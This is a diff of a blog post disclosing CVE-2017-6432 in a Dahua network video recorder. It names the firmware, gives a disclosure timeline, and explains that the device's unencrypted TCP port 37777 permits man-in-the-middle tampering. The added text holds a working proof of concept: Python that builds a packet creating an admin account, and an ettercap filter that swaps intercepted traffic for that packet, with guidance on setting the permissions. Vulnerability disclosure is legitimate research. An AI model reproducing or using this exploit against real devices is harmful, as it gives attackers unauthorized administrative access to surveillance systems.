@@ -1,13 +1,13 @@
 ---
 layout: post
-title:  "Dahua NVR - CVE-2017-6432"
+title:  "Dahua NVR - Exploiting - CVE-2017-6432"
 date:   2017-03-09 21:00:00 +1100
 categories: exploit dahua
 ---
 
 ### Introduction
 
-After discovering the Exposures identified here [https://nullku7.github.io/stuff/exposure/dahua/2017/02/24/dahua-nvr.html](https://nullku7.github.io/stuff/exposure/dahua/2017/02/24/dahua-nvr.html)
+After discovering the Exposures identified [here](https://nullku7.github.io/stuff/exposure/dahua/2017/02/24/dahua-nvr.html)
 I decided to try to inject a new user into the system by modifying packets in the TCP Stream
 
 #### Disclosure Timeline
@@ -18,7 +18,7 @@ I decided to try to inject a new user into the system by modifying packets in th
 - 2017-03-07: Requested response for this: CVE-2017-6432 again
 - 2017-03-09: Disclosure
 
-### The Hardware
+### The Hardware and Software
 
 - NVR Model: DHI-HCVR7216A-S3
 - NVR Firmware: 3.210.0001.10 build: 2016-6-6
@@ -28,13 +28,39 @@ I decided to try to inject a new user into the system by modifying packets in th
 
 ### The method
 
-I will be filling in all the details tomorrow.  If your here now, your too early.  Come back later.
+When the Dahua Software (Mobile Phone application, or Desktop application, as identified above) connects to the NVR, it creates a TCP Connection to Socket 37777.  
+This TCP Connection must be authorised before the NVR will respond.  
+Without a valid authrorisation sending any data to this port, will cause the NVR to close the connection.  
 
-In short.
-MitM + ettercap Filter = pwn
+As there is no encryption, any data transmitted over this connection is exposed to being read via a Man in the Middle attack, as identified in my previous report [here](https://nullku7.github.io/stuff/exposure/dahua/2017/02/24/dahua-nvr.html)
+
+This in turn, makes this connection vulnerable to both packet manipulation and packet injection.
+
+The Proof of Concept has been performed using Ettercap, an Ettercap Filter, and Ettercap to perform the Man in the Middle attack.  
 
 
-ettercap filter
+### Proof of Concept
+
+This ettercap filter was the original Proof of Concept.
+
+First, we need to generate the packet for a new user.
+```python
+newuser="null"
+newpass="ku7"
+content = "0:" + newuser + ":" + newpass + ":1:1::1"
+length = chr(len(content))
+payload = "\xa6\x00\x00\x00" + length + "\x00\x00\x00\x06" + "\x00"*23 + content
+```
+The :1:1::1 following the username and password is the groups and permissions, this is a basic account with admin rights, which can only modify configuration.  Whatever permissions and groups that are wanted, simply replace that.  
+The 0: at the start is the user id.  A 0 causes the NVR to automatically assign the next free user ID to the new user.
+
+In order to get the payload in a usable format, I simply used scapy to generate the packet, and took the payload.
+![img]({{ site.github.url }}/images/Screen Shot 2017-03-09 at 9.10.54 pm.png){:class="img-responsive"}
+
+
+Now that we have our content, the following ettercap filter is used.
+What is packtet I'm replaceing, honestly, I don't care, and it doesn't matter what you replace, as soon as it gets the packet it expects, it works.
+
 ```
 if (ip.proto == TCP && tcp.dst == 37777 && DATA.data + 0 == "\xa4" && DATA.data + 8 == "\x1a" ){
     msg("Found One");
@@ -44,5 +70,11 @@ if (ip.proto == TCP && tcp.dst == 37777 && DATA.data + 0 == "\xa4" && DATA.data 
     msg("Done");
 }
 ```
+
+So here you can see, based upon the hexdump of the log, that the filter captured the packet as we asked, and replaced it with the packet we wanted.  It did this twice, and that did not cause any unexpected behaviour, only 1 account was created.
 ![img]({{ site.github.url }}/images/Screen Shot 2017-03-02 at 12.51.14 am.png){:class="img-responsive"}
+
+And here is our new account as seen in the Desktop Software.
 ![img]({{ site.github.url }}/images/Screen Shot 2017-03-02 at 12.52.38 am.png){:class="img-responsive"}
+
+
